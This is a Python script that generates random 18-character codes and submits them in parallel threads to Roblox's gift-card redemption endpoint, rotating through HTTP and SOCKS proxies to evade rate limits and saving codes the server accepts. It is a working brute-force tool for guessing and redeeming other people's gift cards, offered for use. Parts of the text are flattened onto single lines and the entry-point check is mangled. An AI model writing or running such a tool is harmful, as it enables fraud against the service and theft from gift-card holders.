import random import string import requests import threading import time

proxies = []

def load_proxies(): global proxies source = input("Enter proxy source (file/link): ").strip().lower() if source == "file": with open('proxies.txt', 'r') as f: proxies = [line.strip() for line in f.readlines() if line.strip()] elif source == "link": url = input("Enter proxy link: ").strip() try: response = requests.get(url) if response.status_code == 200: proxies = response.text.strip().split('\n') print(f"Loaded {len(proxies)} proxies from link.") else: print("Failed to fetch proxies from link.") except Exception as e: print(f"Error fetching proxies: {e}")

def get_random_proxy(): if proxies: return random.choice(proxies) return None

def generate_code(): return ''.join(random.choices(string.ascii_uppercase + string.digits, k=18))

def save_code(code): with open('cds.txt', 'a') as f: f.write(f"{code}\n")

def check_code(code, proxy_mode): url = "https://apis.roblox.com/payments-gateway/v1/gift-card/redeem" headers = { "Content-Type": "application/json" }

proxy = get_random_proxy() if proxy_mode else None
proxy_dict = {}

if proxy:
    if proxy.startswith("http"):
        proxy_dict = {"http": proxy, "https": proxy}
    elif proxy.startswith("socks4"):
        proxy_dict = {"http": f"socks4://{proxy}", "https": f"socks4://{proxy}"}
    elif proxy.startswith("socks5"):
        proxy_dict = {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"}

try:
    response = requests.post(url, json={"pinCode": code}, headers=headers, proxies=proxy_dict if proxy else None)
    if response.status_code == 200:
        print(f"[VALID] {code}")
        save_code(code)
    else:
        print(f"[INVALID] {code}")
except Exception as e:
    print(f"[ERROR] {code} - {e}")

def fetcher(count, proxy_mode): for _ in range(count): code = generate_code() print(f"[FETCHED] {code}") save_code(code)

def checker(proxy_mode): with open('cds.txt', 'r') as f: codes = [line.strip() for line in f.readlines()]

threads = []
for code in codes:
    t = threading.Thread(target=check_code, args=(code, proxy_mode))
    t.start()
    threads.append(t)

for t in threads:
    t.join()

def main(): mode = input("Select mode (fetcher/checker): ").strip().lower() proxy_mode = input("Use proxies? (yes/no): ").strip().lower() == 'yes'

if proxy_mode:
    load_proxies()

if mode == "fetcher":
    count = int(input("How many codes to fetch: "))
    fetcher(count, proxy_mode)

elif mode == "checker":
    checker(proxy_mode)

else:
    print("Invalid mode!")

if name == "main": main()

